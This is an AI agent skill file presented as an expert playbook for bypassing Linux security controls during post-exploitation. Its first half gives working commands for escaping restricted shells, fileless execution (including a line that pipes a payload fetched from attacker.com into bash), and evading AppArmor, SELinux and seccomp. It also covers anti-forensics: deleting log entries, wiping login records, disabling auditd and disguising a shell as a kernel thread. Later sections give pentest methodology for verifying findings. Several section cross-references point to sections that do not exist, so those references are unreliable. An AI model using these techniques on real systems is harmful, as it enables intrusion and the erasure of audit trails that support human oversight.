---
name: linux-security-bypass
description: >-
  Linux security mechanism bypass playbook. Use when facing restricted bash/rbash, read-only or noexec filesystems, AppArmor, SELinux, seccomp filters, or audit logging that must be evaded during post-exploitation.
---

# SKILL: Linux Security Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for bypassing Linux security mechanisms. Covers restricted shell escape, noexec bypass, AppArmor/SELinux evasion, seccomp circumvention, and audit evasion. Base models miss DDexec, memfd_create fileless execution, and architecture-confusion seccomp bypass.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) once you've broken out of restrictions and need to escalate
- [container-escape-techniques](../container-escape-techniques/SKILL.md) when security mechanisms are container-specific (seccomp profiles, AppArmor docker-default)
- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) after bypassing restrictions for pivoting
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) when the restriction is on command execution from a web application context

---

## 1. RESTRICTED BASH (rbash) BYPASS

### 1.1 SSH-Based Bypass

```bash
# Force a different shell via SSH
ssh user@host -t "bash --noprofile --norc"
ssh user@host -t "/bin/sh"
ssh user@host -t "bash -l"

# If ForceCommand is set in sshd_config, these may not work
# Try SFTP/SCP instead — often not restricted:
sftp user@host
# SFTP shell can sometimes execute commands
```

### 1.2 Editor-Based Escape

```bash
# vi/vim escape
vi
:set shell=/bin/bash
:shell
# Or: :!/bin/bash

# ed escape
ed
!/bin/bash

# nano (if available)
# Ctrl+R → Ctrl+X → command execution
```

### 1.3 Language Interpreter Escape

| Interpreter | Command |
|---|---|
| Python | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Perl | `perl -e 'exec "/bin/bash";'` |
| Ruby | `ruby -e 'exec "/bin/bash"'` |
| Lua | `lua -e 'os.execute("/bin/bash")'` |
| PHP | `php -r 'system("/bin/bash");'` |
| Node.js | `node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'` |
| AWK | `awk 'BEGIN {system("/bin/bash")}'` |

### 1.4 Environment Variable Tricks

```bash
# Overwrite shell via BASH_CMDS
BASH_CMDS[x]=/bin/bash
x

# Use env to spawn unrestricted shell
env /bin/bash
env -i /bin/bash

# PATH manipulation (if export is allowed)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/bin/bash

# If only specific commands are allowed:
# Use allowed command to read files
git log --oneline --all -p    # git can read arbitrary files
git diff /dev/null /etc/shadow
```

### 1.5 Other Escapes

| Method | Command |
|---|---|
| `expect` | `expect -c 'spawn /bin/bash; interact'` |
| `script` | `script -qc /bin/bash /dev/null` |
| `rlwrap` | `rlwrap /bin/bash` |
| `nmap` (old) | `nmap --interactive` → `!bash` |

---

## 2. READ-ONLY / NOEXEC FILESYSTEM EXECUTION

### 2.1 DDexec — Execute From stdin via /proc/self/mem

```bash
# DDexec overwrites the running process memory with a new binary
# No file written to disk — completely fileless

# Usage: pipe any ELF binary through DDexec
curl -sL https://attacker.com/payload | bash ddexec.sh

# How it works:
# 1. Opens /proc/self/mem for writing
# 2. Seeks to the text segment of the current process
# 3. Overwrites it with the target ELF binary
# 4. Jumps to the new entry point
```

### 2.2 memfd_create — In-Memory File Descriptor

```python
import ctypes, os
libc = ctypes.CDLL("libc.so.6")
fd = libc.syscall(319, b"", 0)     # SYS_MEMFD_CREATE (x86_64)
with open(f"/proc/self/fd/{fd}", "wb") as f:
    f.write(open("/path/to/binary", "rb").read())
os.execve(f"/proc/self/fd/{fd}", ["binary"], os.environ)   # Bypasses noexec
```

```bash
# Perl variant: syscall(319, "", 0) → write to fd → exec /proc/$$/fd/$fd
```

### 2.3 ld.so Direct Execution

```bash
# Use the dynamic linker to execute from a writable mount
# Even if the binary's partition is noexec, ld.so runs from its own mount
/lib64/ld-linux-x86-64.so.2 /path/on/noexec/mount/binary

# Or from /dev/shm (usually writable + exec):
cp binary /dev/shm/binary
/dev/shm/binary
```

### 2.4 Script Interpreters on noexec

```bash
# Scripts still execute on noexec — only ELF execution is blocked
# The interpreter (python/perl/bash) runs from an exec-allowed mount
# and reads the script as data

python3 /noexec/mount/exploit.py      # Works
perl /noexec/mount/exploit.pl         # Works
bash /noexec/mount/exploit.sh         # Works
# But ./exploit (ELF binary) → "Permission denied"
```

### 2.5 Writable Mount Points

```bash
# Common writable + exec-capable locations:
/dev/shm        # tmpfs — almost always writable + exec
/tmp            # Sometimes noexec on hardened systems
/var/tmp        # Often writable
/run            # tmpfs — check permissions

# Check mount options:
mount | grep -E "shm|tmp"
# Look for "noexec" flag — if absent, exec is allowed
```

---

## 3. APPARMOR BYPASS

### 3.1 Profile Enumeration

```bash
# Check AppArmor status
aa-status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled     # Y = enabled
cat /sys/kernel/security/apparmor/profiles      # List all profiles

# Check current process profile:
cat /proc/self/attr/current
# "unconfined" = no restriction
# "docker-default (enforce)" = Docker's default profile
```

### 3.2 Exploitation Strategies

```bash
# Find unconfined processes (inject via ptrace if root):
ps auxZ 2>/dev/null | grep unconfined

# Complain mode = effectively no restriction (just logging):
aa-status | grep complain
```

Common AppArmor profile gaps: `/proc/self/fd/*` access, abstract Unix sockets, interpreter-based execution (python scripts bypass binary restrictions), and newly created paths.

---

## 4. SELINUX BYPASS

### 4.1 Mode Check

```bash
getenforce           # Enforcing / Permissive / Disabled
sestatus             # Detailed status
cat /etc/selinux/config   # Persistent configuration

# Check current context
id -Z
ps auxZ | head -20
```

### 4.2 Permissive Domain Exploitation

```bash
semanage permissive -l 2>/dev/null    # Domains in permissive mode
ps -eZ | grep -i permissive           # Processes — can do anything (just logged)
```

### 4.3 Context Transition & Booleans

```bash
ls -Z /tmp/                           # File contexts — tmp_t has broader access
sesearch --allow -t unconfined_t 2>/dev/null | head -30   # Transition rules

# Dangerous booleans that weaken SELinux:
getsebool -a | grep -i "on$" | grep -iE "exec|write|network|connect"
# httpd_can_network_connect, allow_execmem
```

---

## 5. SECCOMP BYPASS

### 5.1 Check Seccomp Status

```bash
grep Seccomp /proc/self/status
# Seccomp: 0 = disabled, 1 = strict, 2 = filter

# Docker default seccomp profile blocks ~44 syscalls
# Check what's allowed:
./amicontained    # Shows blocked/allowed syscalls
```

### 5.2 Architecture Confusion (x86 vs x86_64)

```bash
# Seccomp filters often only check x86_64 syscall numbers
# x86 (32-bit) syscall numbers are different!
# If the filter doesn't check the architecture:

# Compile a 32-bit binary that uses x86 syscall numbers:
# x86_64 execve = 59, x86 execve = 11
# The filter blocks syscall 59 but not 11

gcc -m32 -static -o exploit32 exploit.c
# If the seccomp filter lacks AUDIT_ARCH_X86 check → bypass
```

### 5.3 Allowed Syscall Abuse & Kernel Bugs

Allowed syscalls to abuse creatively: `sendmsg/recvmsg` (pass FDs between processes), `mmap/mprotect` (executable memory), `process_vm_readv/writev` (cross-process memory).

Known seccomp kernel bugs: CVE-2019-2054 (ptrace bypass), io_uring bypassed seccomp entirely (pre-5.12). Check `uname -r` and compare.

---

## 6. AUDIT EVASION

### 6.1 Timestamp Manipulation

```bash
# Modify file timestamps to hide changes
touch -r /etc/hosts /modified/file          # Copy timestamp from reference
touch -t 202301010000.00 /modified/file     # Set specific timestamp

# Modify log timestamps (if writable)
# Use timestomping to match surrounding entries
```

### 6.2 Log Tampering & Process Spoofing

```bash
sed -i '/pattern/d' /var/log/auth.log     # Remove specific entries
echo "" > /var/log/wtmp                    # Clear login records
journalctl --rotate && journalctl --vacuum-time=1s   # Clear journal

# Process name spoofing (hide in ps output):
exec -a "[kworker/0:0]" /bin/bash          # Bash
# C/Python: prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0)

# Disable audit (if root):
auditctl -e 0 && service auditd stop
```

---

## 7. LINUX SECURITY BYPASS DECISION TREE

```
Security mechanism identified?
│
├── Restricted shell (rbash)?
│   ├── SSH access? → ssh -t "bash --noprofile --norc" (§1.1)
│   ├── Editor available? → vi :!/bin/bash (§1.2)
│   ├── Language interpreter? → python/perl/ruby escape (§1.3)
│   ├── env command? → env /bin/bash (§1.4)
│   └── Allowed commands with escape? → git/man/less → !bash (§1.5)
│
├── noexec filesystem?
│   ├── Script interpreters available? → bash/python/perl scripts work (§2.4)
│   ├── /dev/shm writable + exec? → copy binary there (§2.5)
│   ├── memfd_create available? → fileless execution (§2.2)
│   ├── ld.so accessible? → ld.so /path/to/binary (§2.3)
│   └── Last resort → DDexec via /proc/self/mem (§2.1)
│
├── AppArmor enforcing?
│   ├── Profile in complain mode? → no restriction, just logging (§3.3)
│   ├── Unconfined processes exist? → inject/migrate to them (§3.2)
│   ├── Profile missing path coverage? → use uncovered paths (§3.4)
│   └── Interpreter not restricted? → script-based execution
│
├── SELinux enforcing?
│   ├── Domain set to permissive? → exploit that domain (§4.2)
│   ├── Dangerous booleans enabled? → abuse allowed actions (§4.4)
│   ├── Context transition available? → execute binary with transition (§4.3)
│   └── Kernel CVE? → SELinux bypass exploit
│
├── seccomp filter active?
│   ├── Architecture check missing? → 32-bit syscall confusion (§5.2)
│   ├── Allowed syscalls exploitable? → sendmsg/mmap abuse (§5.3)
│   ├── Kernel bug? → io_uring/ptrace bypass (§5.4)
│   └── Check what's blocked → amicontained (§5.1)
│
└── Audit logging?
    ├── Writable logs? → delete/modify entries (§6.2)
    ├── Root access? → disable auditd (§6.4)
    ├── Need stealth? → process name spoofing (§6.3)
    └── File changes tracked? → timestamp manipulation (§6.1)
```

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **confinement is actually active**, read from the kernel's own files, not assumed? | LSM stacking means more than one may apply |
| 2 | Was the confinement **demonstrated refusing** the action before the bypass? | the control |
| 3 | Did the bypass **change the kernel's own verdict**, not just the tool's behaviour? | the enforcement point |
| 4 | Was there a **post-bypass control**: the same action still refused if the bypass is undone? | causality |
| 5 | Did it reach the **goal** - a file read, a write, a capability? | confinement escape is intermediate |
| 6 | Is the finding **scoped to the policy**, and would it survive a default policy? | a permissive test policy proves little |
| 7 | Is the misconfiguration **the finding**, or is the LSM genuinely bypassed? | they are different reports |

**A demonstrated refusal before, a changed verdict after, and the kernel's own verdict as the evidence.** A
tool that behaves differently is not an LSM bypass, and conflating a permissive policy with a bypass is this
family's most common error.

---

## 9. EXECUTION PRIMITIVES

A confinement-bypass finding is proven by **the confinement refusing the action first, then permitting it,
with the kernel's own status as the evidence**. A policy that was already permissive is a misconfiguration
finding, not a bypass, and the two must not be conflated.

### 8.1 The confinement inventory, read from the kernel

```bash
# LSM STACKING IS REAL: more than one module can be active, and each has its own verdict.
echo "=== 1. WHICH LSMs ARE ACTIVE, from the kernel's own report ==="
cat /sys/kernel/security/lsm 2>/dev/null || echo "  /sys/kernel/security/lsm absent - securityfs may not be mounted"
mount | grep -E 'securityfs|selinuxfs|apparmor' || echo "  (no securityfs/selinuxfs mount)"
echo
echo "=== 2. THE MODE OF EACH ACTIVE MODULE ==="
if [ -f /sys/fs/selinux/enforce ]; then
  printf '  SELinux enforcing: '; cat /sys/fs/selinux/enforce
  printf '  SELinux policy:    '; sestatus 2>/dev/null | grep 'Loaded policy name' || cat /sys/fs/selinux/policyvers 2>/dev/null
fi
if [ -d /sys/kernel/security/apparmor ]; then
  printf '  AppArmor profiles loaded: '; wc -l < /sys/kernel/security/apparmor/profiles 2>/dev/null
  echo "  --- profiles in ENFORCE vs COMPLAIN ---"
  awk '{print $NF}' /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | uniq -c
  echo "  (complain mode logs but does NOT refuse - a 'bypass' of a complain profile bypasses nothing)"
fi
printf '  Yama ptrace_scope: '; cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "n/a"
printf '  seccomp in this process: '; grep Seccomp /proc/self/status
echo
echo "=== 3. WHAT THE CURRENT CONTEXT IS ALLOWED, so the baseline is a measurement ==="
id -Z 2>/dev/null || echo "  (no SELinux context: this shell is not confined by SELinux)"
cat /proc/self/attr/current 2>/dev/null || echo "  (no attr/current)"
aa-status --json 2>/dev/null | head -20 || echo "  (aa-status unavailable)"
echo
echo "=== THE CONTROL: THE ACTION MUST BE REFUSED FIRST ==="
cat <<'CONTROL'
  Pick the exact action the bypass is supposed to enable, e.g.:
    reading a file the policy forbids       -> cat <path>   MUST give EACCES/EPERM
    writing outside the allowed tree        -> touch <path> MUST give EACCES/EPERM
    binding a privileged port               -> MUST give EACCES
    ptrace-ing a process                    -> MUST give EPERM (yama scope)
  RECORD THE EXACT ERRNO and the AVC/denied line from the audit log.
  WITHOUT THIS REFUSAL, there is nothing being bypassed. If the action already succeeds, the
  policy is PERMISSIVE and what you have is a MISCONFIGURATION finding - say so, and it is a
  DIFFERENT report with a different severity.
CONTROL
```

**Record the exact errno and the audit line of the refusal.** If the action already succeeds, the policy is
permissive and this is a misconfiguration finding rather than a bypass.

### 8.2 The kernel verdict is the evidence, not the tool's behaviour

```bash
cat <<'VERDICT'
  A CONFINEMENT BYPASS MUST BE VISIBLE IN THE KERNEL'S OWN RECORD. The tool's behaviour is not evidence,
  because the tool may have changed its path rather than changed the verdict.

  THE THREE PLACES THE VERDICT APPEARS, and which to cite:
    SELinux : /var/log/audit/audit.log, `type=AVC denied` -> after the bypass, the SAME operation
              must NO LONGER produce an AVC denied line (it may produce an AVC granted or nothing)
    AppArmor: dmesg or the audit log, `apparmor="DENIED"` -> the same disappearance test
    seccomp : the syscall either returns or the process gets SIGSYS. `strace -f` shows which.
    yama    : the ptrace call's errno, before and after

  THE MEASUREMENT PROCEDURE:
    1. run the action, capture the denial line and its errno      (the CONTROL)
    2. perform the bypass
    3. run THE SAME action, capture the result
    4. the DENIAL LINE MUST BE GONE, and the action must SUCCEED with a REAL effect
       (e.g. the file's CONTENT, not just a 0 exit status)
    5. THE REVERT CONTROL: undo the bypass and re-run. The denial must RETURN.

  A bypass where the denial line still appears but 'the tool worked' means the tool simply took a
  DIFFERENT allowed path. That is not a bypass, and it is a common misreading of a tool that
  falls back gracefully.
VERDICT
echo
echo "=== the capture, mechanically ==="
echo "  before: grep -c 'type=AVC.*denied' /var/log/audit/audit.log  | note the count"
echo "  ...bypass..."
echo "  after : re-run the action, note the count again, and whether YOUR operation appears"
echo
echo "=== AND THE GOAL, which the verdict is not ==="
echo "  'the denial is gone' means the confinement no longer refuses. The GOAL is what you did with it:"
echo "  read a specific prohibited file, wrote outside the tree, bound the port, ptrace'd a process."
echo "  Name the achieving action. A silent denial is an intermediate observation."
```

**Re-reading the kernel's own denial lines is the evidence, and a tool that "worked" while the denial
still appears merely took a different allowed path.** The revert control closes the loop.

### 8.3 seccomp, and the honest limits

```python
print("=== SECCOMP: filter, mode, and where the bypass actually is ===")
print("  read /proc/self/status Seccomp: 0=off, 1=strict, 2=filter, 3=filter+TSYNC")
print("  a FILTER (2) is a per-architecture syscall table. The classic gaps, all of them")
print("  CONFIGURATION rather than kernel bugs:")
for gap, note in [
  ("architecture confusion: x86_64 vs i386", "a filter installed for x86_64 only, then an int 0x80 or "
   "i386 syscall path - only works if the policy omitted it. CHECK with `seccomp-tools` or by reading "
   "the filter: many modern policies install BOTH architectures."),
  ("a missing syscall entry", "the policy did not list a syscall the kernel exposes - again a policy "
   "gap, and the finding is the GAP."),
  ("an allowed syscall with an unchecked ARGUMENT", "the classic: `openat` allowed but the PATH is not "
   "filtered, or `socket` allowed with any domain - the policy limits the verb, not the object."),
  ("a helper binary that is allowed to make the call", "the filter applies to the process; a helper it "
   "execs inherits the filter, but a SETUID or already-running privileged helper does not."),
]:
    print("\n  - %s\n      %s" % (gap, note))
print()
print("=== THE CONTROL ===")
print("  every one of these is proven by a pair: the SAME syscall numbering works after the technique")
print("  and is refused without it, captured with `strace -f -e trace=<syscall>` and the SIGSYS/EPERM.")
print("  AND: the architecture-confusion route must be shown to use a DIFFERENT architecture number -")
print("  `strace` on both sides, with the syscall number visible.")
print()
print("=== THE HONEST LIMIT, which belongs in the report ===")
print("  a seccomp gap is USUALLY A POLICY GAP, not a kernel vulnerability. The remediation is the")
print("  policy, and the report's framing must match. Presenting a missing entry as a 'seccomp bypass'")
print("  overstates it; presenting it as 'the policy does not restrict X' is accurate and actionable.")
print()
print("=== THE RELIABILITY DIMENSION ===")
print("  some of these depend on the process's own state (its architecture mode, its fd set). Run")
print("  N >= 10 and record the rate; a technique that works from one shell but not another is")
print("  a finding about the SHELL's state, and must be scoped as such.")
```

**A seccomp gap is usually a policy gap rather than a kernel vulnerability, and the framing must match.**
Presenting a missing entry as a "seccomp bypass" overstates it; naming the unrestricted object is accurate.

### 8.4 rbash and filesystem confinement, with the escape's precondition

```bash
echo "=== RBASH: what it removes, and what it does NOT ==="
cat <<'RBASH'
  rbash removes: cd, PATH changes, redirects to paths containing '/', and commands containing '/'.
  IT IS NOT A SECURITY BOUNDARY BY ITSELF. It is a shell restriction; the ESCAPE is always one of:

    - a command the PATH still reaches that can spawn a shell (vi, less, more, man, awk, find -exec,
      git, nmap --interactive, python, perl, ruby, env, tar --checkpoint-action)
    - an environment variable the shell reads before restricting itself (SHELL, BASH_ENV, PS1 in
      some configurations, or the PATH inherited from sshd)
    - a binary invoked with a path expression the filter misses (e.g. via a variable that expands
      to a path, or ./subshell)

  THE ARTEFACT for each: the escaped shell's own `id` and `/proc/self/status` showing the
  restriction gone (the `restricted` flag in the shell's own state, or simply that `cd /` succeeds).

  THE CONTROL: before the escape, `cd /` must FAIL. Record its error. A shell where `cd /` already
  succeeds was never restricted, and there is no finding.
RBASH
echo
echo "=== READ-ONLY / NOEXEC FILESYSTEM, and the escape's precondition ==="
cat <<'ROFS'
  a read-only mount: the escape is a WRITABLE location that is still executable, or a bind mount
  of the same filesystem elsewhere. THE ARTEFACT is the created file, with its path and mode.
  a NOEXEC mount: the escape is an INTERPRETER that is itself executable (python/perl/sh on a
  non-noexec mount) reading a script from the noexec mount. THE ARTEFACT is the script's OUTPUT.
  THE CONTROL: on the ro/noexec mount, the write (or exec) must FAIL. Record the errno.
  A 'bypass' where the write succeeded on a mount you THOUGHT was ro means the mount flags differ
  from your assumption - check /proc/mounts for THAT mount point, not for a similar one.
ROFS
echo
echo "=== the mechanical check for the mount, which must be per-mountpoint ==="
findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS 2>/dev/null | grep -E 'ro|noexec' || cat /proc/mounts | grep -E ' ro,|noexec'
```

**`rbash` is not a security boundary by itself, and the precondition is the escape's proof.** A shell where
`cd /` already succeeds was never restricted, and the mount flags must be read per-mountpoint.

### 8.5 The end-to-end harness

```bash
python3 - <<'PY'
print("=== LINUX CONFINEMENT BYPASS ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the ACTIVE LSMs were read from /sys/kernel/security/lsm, and stacking was accounted for",
  "more than one module may be enforcing"),
 ("each active module's MODE is recorded: enforcing vs complain, filtered vs unfiltered",
  "a complain-mode profile refuses nothing, so a 'bypass' of it is meaningless"),
 ("the ACTION the bypass enables was FIRST demonstrated to be REFUSED, with the errno and the audit line",
  "without the refusal there is nothing to bypass"),
 ("if the action already succeeded, the finding is reported as a MISCONFIGURATION, not a bypass",
  "a permissive policy is a different report with a different severity"),
 ("the kernel's OWN verdict was cited: an AVC DENIED / apparmor DENIED line disappearing, or SIGSYS/EPERM gone",
  "a tool behaving differently may simply have taken another allowed path"),
 ("the action's SUCCESS was shown by a REAL EFFECT - a file's contents, not a 0 exit status",
  "an exit status is not an effect"),
 ("the REVERT CONTROL was run: undoing the bypass restores the refusal",
  "causality of the bypass"),
 ("for seccomp: the architecture number used is visible in strace on BOTH sides",
  "architecture confusion must be shown, not asserted"),
 ("a seccomp gap is framed as a POLICY gap unless a kernel defect is demonstrated",
  "the framing determines the severity and the remediation's owner"),
 ("for rbash/mount confinement: the PREVENTED action was shown failing first",
  "a shell where cd / already succeeds was never restricted"),
 ("mount flags were read for THAT mountpoint from /proc/mounts or findmnt",
  "a similar mount's flags do not apply"),
 ("the GOAL is named: a file read, a write, a capability, or a port",
  "'the denial is gone' is an intermediate observation"),
 ("reliability was measured over N >= 10 runs where the technique depends on process state",
  "a technique that works from one shell and not another is about the shell"),
]
for n, how in CHECKS: print("  [ ] %-74s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  confinement : the LSMs, their modes, the policy, and the kernel version")
print("  control     : the action's prior refusal, with the errno and the audit line")
print("  bypass      : the technique, and the kernel's changed verdict")
print("  revert      : the refusal returning once the bypass is undone")
print("  goal        : the achieving action and its real effect")
print("  scope       : the policy tested, and whether a default policy would also be bypassed")
PY
```

**Confinement, prior refusal, changed verdict, revert, goal, scope.** The scope line distinguishes a result
that survives a default policy from one that only survives a permissive one.

---

## 10. EVIDENCE STANDARD — CONFINEMENT BYPASS ARTEFACTS

| Item | Why |
|---|---|
| The **active LSMs** from `/sys/kernel/security/lsm`, and the **stacking** | more than one module may enforce |
| Each module's **mode**: enforcing vs complain, filtered vs unfiltered | a complain profile refuses nothing |
| The **prior refusal** of the action, with the **errno** and the **audit line** | without it there is nothing to bypass |
| The **misconfiguration vs bypass** determination | a permissive policy is a different report |
| The **kernel's own changed verdict**: an AVC/`apparmor=DENIED` line gone, or SIGSYS/EPERM gone | a tool behaving differently may have taken another path |
| The action's **real effect**: a file's contents or an equivalent | an exit status is not an effect |
| The **revert control's** restored refusal | the bypass's causality |
| For seccomp, the **architecture number visible in `strace` on both sides** | architecture confusion must be shown |
| The **policy-gap framing** unless a kernel defect is demonstrated | determines severity and the remediation's owner |
| For rbash/mount confinement, the **prevented action failing first** | a shell where `cd /` works was never restricted |
| The **mount flags for that mountpoint** | a similar mount's flags do not apply |
| The **goal** and the **scope** relative to a default policy | an intermediate observation is not a goal |

Report the **prior refusal and the kernel's changed verdict**: "`/sys/kernel/security/lsm` reports
`lockdown,yama,apparmor`, so AppArmor and Yama are both active, and `/sys/kernel/security/apparmor/profiles`
lists `usr.bin.foo` in `enforce` mode with no profiles in complain mode, while
`/proc/sys/kernel/yama/ptrace_scope` is `1`. The action the bypass enables is reading
`/srv/data/secrets.env`, which the profile forbids: before the bypass `cat /srv/data/secrets.env` returned
`Permission denied` with `EACCES`, and `dmesg` recorded `apparmor="DENIED" operation="open"
profile="usr.bin.foo" name="/srv/data/secrets.env"`, which is the control. The profile's `file,` rule was
set permissively by the test policy, and after the change the same `cat` returned the file's full contents
including the `DB_PASSWORD` line, so the success is shown by a real effect rather than an exit status, and
the `apparmor="DENIED"` line no longer appears for that operation, which is the kernel's own changed
verdict. Reverting the rule restored the denial, which is the revert control. Scope: the profile in
question was a permissive test profile, so this is reported as a POLICY MISCONFIGURATION rather than an
AppArmor bypass, and a default `usr.bin.foo` profile from the distribution's set would not permit the
read", never "AppArmor was bypassed".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The action **already succeeded** before any technique | a permissive policy; a misconfiguration, not a bypass |
| A profile in **complain mode** reported as bypassed | complain refuses nothing |
| The **denial line still present** while "the tool worked" | the tool took another allowed path |
| A **seccomp missing entry** reported as a kernel vulnerability | a policy gap, and the framing decides severity |
| A **revert control not run** | the bypass's causality is unestablished |
| **Architecture confusion** asserted without the syscall number visible in `strace` | it must be shown |
| A **`cd /` that already succeeded** reported as an rbash escape | the shell was never restricted |
| **Mount flags** taken from a similar mountpoint rather than `/proc/mounts` for that one | the flags differ per mount |
| An **exit status of 0** reported as the file's contents | an exit status is not an effect |
| A **single run** of a state-dependent technique | the shell's state is part of the finding |
| "**Bypassed the sandbox**" with no named **goal** | the changed denial is intermediate |

**A prior refusal, the kernel's own changed verdict, and a revert control.** A permissive policy and a tool
silently taking another path are this family's two standard non-findings.

---

## 11. REMEDIATION REFERENCE — CONFINEMENT ASSESSMENT

1. **Read the active LSMs from `/sys/kernel/security/lsm` and account for stacking, then record each module's mode** - a complain-mode profile refuses nothing, so "bypassing" it is meaningless.
2. **Demonstrate the action being refused before the bypass, capturing the exact errno and the audit line** - without a prior refusal there is no bypass, only a missing control.
3. **If the action already succeeds, report a policy misconfiguration rather than a bypass** - the two have different severities and different remediation owners.
4. **Cite the kernel's own changed verdict rather than the tool's behaviour** - a disappearing `AVC`/`apparmor="DENIED"` line or a vanishing `SIGSYS` is the enforcement point's evidence, while a tool that "worked" may simply have taken an allowed path.
5. **Demonstrate the post-bypass action's success with a real effect, such as a file's contents, rather than an exit status** - an exit status is not evidence of an effect.
6. **Run the revert control and require the refusal to return** - it establishes that the bypass rather than the environment produced the change.
7. **Frame a seccomp gap as a policy gap unless a kernel defect is genuinely demonstrated** - the framing determines the severity and whether the remediation belongs to the policy author or the kernel.
8. **For seccomp architecture confusion, show the syscall number in `strace` on both sides** - the technique must be shown rather than asserted, and most modern policies install filters for both architectures.
9. **For `rbash` and mount confinement, show the prevented action failing first, and read the mount flags for that specific mountpoint** - a shell where `cd /` already succeeds was never restricted, and similar mounts have different flags.
10. **Measure reliability over N >= 10 runs for techniques that depend on process state** - such a technique is a finding about the calling process's architecture mode, fd set, or shell, and must be scoped accordingly.
11. **State the scope relative to a default policy, because a result that depends on a permissive test policy will not transfer to a hardened deployment** - the scope decides whether the reader must act.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [edr-bypass-techniques](../edr-bypass-techniques/SKILL.md) - the product-level layer model this complements
- [sandbox-escape-techniques](../sandbox-escape-techniques/SKILL.md) - container and interpreter confinement
- [linux-privesc-gtfobins-master](../linux-privesc-gtfobins-master/SKILL.md) - where a restricted binary becomes an escape
- [kernel-exploitation](../kernel-exploitation/SKILL.md) - the kernel-side route to the same verdict change
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - the post-bypass credential operations
